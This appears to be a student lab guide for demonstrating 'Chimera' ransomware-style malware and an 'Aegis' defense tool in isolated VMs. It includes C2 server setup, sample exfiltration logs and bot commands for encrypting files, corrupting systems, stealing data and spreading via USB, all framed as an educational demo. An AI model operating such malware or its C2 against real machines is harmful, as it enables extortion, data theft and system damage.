# 🎯 COMPLETE USER GUIDE: Chimera Malware & Aegis Defense System

## 📋 Table of Contents
- System Requirements
- Installation Guide
- VMware Network Setup
- Demo Execution Guide
- Command Reference
- Troubleshooting
- Expected Outcomes
- Safety & Recovery
- Demo Tips

---

## 💻 System Requirements
**Hardware:**
- RAM: 8GB minimum (16GB recommended)
- Storage: 50GB free space
- Processor: Multi-core CPU with virtualization support

**Software:**
- VMware Workstation or VirtualBox
- Kali Linux VM (Attacker)
- Windows 10/11 VM (Victim)
- Python 3.8+ on both systems

---

## 🔧 Installation Guide
**Step 1: Install Python Modules**

**On Windows VM (Victim Machine):**
```cmd
# Open Command Prompt as Administrator
pip install cryptography watchdog psutil
```

**On Kali Linux (Attacker Machine):**
```bash
# Open terminal
sudo apt update
sudo apt install python3-pip
pip3 install cryptography
```

**Step 2: File Placement**

**Windows VM:**
```
C:\Demo\
├── chimera_real.py       # Malware
├── aegis_real.py         # Defense system
└── test_files\           # Create some .txt, .docx files here
```

**Kali Linux:**
```
/home/kali/Demo/
└── c2_server.py          # C2 Server
```

**Step 3: Network Configuration**
- Open VMware Network Editor
- Set NAT or Host-only network
- Ensure both VMs can ping each other
- Note the Kali Linux IP (use `ip addr` command)
- Update C2 Server IP in Chimera:

```python
# In chimera_real.py, line 23:
C2_SERVER = "192.168.1.100"  # Change to your Kali Linux IP
```

---

## 🌐 VMware Network Setup
**Option 1: NAT Network (Recommended)**
- Both VMs set to NAT
- They can communicate but are isolated from host
- Find Kali IP: `ip addr show eth0`

**Option 2: Host-only Network**
- Both VMs set to Host-only
- Completely isolated from external networks
- Default network: 192.168.1.x

**Verify Connectivity:**
```bash
# On Kali Linux:
ping 192.168.1.50  # Should be Windows VM IP

# On Windows:
ping 192.168.1.100  # Should be Kali Linux IP
```

---

## 🚀 Demo Execution Guide
### Demo Scenario 1: Basic Attack & Defense
**Step 1: Prepare Test Environment**
```cmd
# On Windows VM - Create test files
mkdir C:\TestFiles
echo "This is a test document" > C:\TestFiles\document1.txt
echo "Important data here" > C:\TestFiles\document2.pdf
```

**Step 2: Start C2 Server (Kali Linux)**
```bash
cd /home/kali/Demo
python3 c2_server.py
```
**Expected Output:**
```
[2024-11-28 10:00:00] [INFO] Enhanced C2 Server started on 0.0.0.0:4444
[2024-11-28 10:00:00] [INFO] Waiting for bot connections...
```

**Step 3: Run Malware (Windows VM)**
```cmd
cd C:\Demo
python chimera_real.py
```

**Step 4: Observe Real-time Interaction**
In C2 Server Console:
```
[2024-11-28 10:00:15] [INFO] New bot connection: BOT_0001 from 192.168.1.50:54321
[2024-11-28 10:00:15] [INFO] Bot BOT_0001 registered: DESKTOP-VICTIM - User123
[2024-11-28 10:00:16] [EXFILTRATION] Bot BOT_0001 exfiltrated data: exfiltrated_data/BOT_0001_1732807816.txt
```

**Step 5: Send Commands from C2**
```
C2> list
C2> broadcast system_info
C2> command BOT_0001 encrypt_files
```

### Demo Scenario 2: Defense System Activation
**Step 1: Start Defense System (Windows VM)**
```cmd
# Open NEW Command Prompt as Administrator
cd C:\Demo
python aegis_real.py
```

**Step 2: Run Malware Attack**
```cmd
# In separate Command Prompt
python chimera_real.py
```

**Step 3: Observe Defense Actions**
- Aegis will detect and terminate malware processes
- File encryption will be blocked
- C2 communication will be prevented
- Real-time alerts will be displayed

---

## 🎮 Command Reference
**C2 Server Commands:**
```
list                    - Show all connected bots
broadcast <command>     - Send command to all bots
command <bot_id> <cmd>  - Send command to specific bot
cleanup                 - Remove inactive bots
status                  - Show server status
exit                    - Shutdown server
```

**Available Bot Commands:**
```
encrypt_files           - Encrypt victim's files
corrupt_system          - Corrupt system files
exfiltrate              - Steal and send data
system_info             - Get system information
status                  - Check bot status
propagate               - Spread via USB
shutdown                - Stop malware
```

**Malware Execution Options:**
```cmd
# Normal execution
python chimera_real.py

# Decryption mode (after attack)
python chimera_real.py --decrypt YOUR_ENCRYPTION_KEY
```

---

## 🔧 Troubleshooting
**Common Issues & Solutions:**
1. Connection Failed:
```
[-] C2 Connection failed: [WinError 10060]
Solution: Check firewall settings and ensure VMs can ping each other.
```
2. Module Not Found:
```
ModuleNotFoundError: No module named 'cryptography'
Solution: Run pip install cryptography watchdog psutil
```
3. Permission Denied:
```
PermissionError: [WinError 5] Access is denied
Solution: Run Command Prompt as Administrator
```
4. File Encryption Not Working:
- Check if test files exist in Documents/Desktop
- Verify file extensions match TARGET_EXTENSIONS
- Run as Administrator for full access

5. Defense System Not Detecting:
- Ensure Aegis is running as Administrator
- Check if malware process names match signatures
- Verify network monitoring is active

**Debug Mode:**
Add this to any script for detailed logging:
```python
import logging
logging.basicConfig(level=logging.DEBUG)
```

---

## 📊 Expected Outcomes
**Successful Attack:**
- Files encrypted with .chimera_encrypted extension
- Ransom notes on desktop
- System corruption markers
- Data exfiltrated to C2 server
- Persistence established

**Successful Defense:**
- Malware processes terminated
- File encryption blocked
- System files protected
- Network exfiltration prevented
- Real-time security alerts

---

## 🛡️ Safety & Recovery
**Before Demo:**
- Take VM snapshots
- Use isolated network
- Have decryption key ready

**After Demo:**
```cmd
# To decrypt files:
python chimera_real.py --decrypt [ENCRYPTION_KEY]
# Key is in chimera_attack_report.txt
```
**Cleanup:**
- Restore VM from snapshot
- Or manually remove:
  - Registry entries
  - Scheduled tasks
  - Malware files

---

## 🎯 Demo Tips
**For Professor Presentation:**
- Show C2 server dashboard with live bot connections
- Demonstrate real-time commands to malware
- Show defense system blocking attacks
- Display encrypted files and ransom notes
- Demonstrate recovery with decryption tool

**Timing:**
- Setup: 5 minutes
- Attack Demo: 3-5 minutes
- Defense Demo: 3-5 minutes
- Q&A: 5 minutes
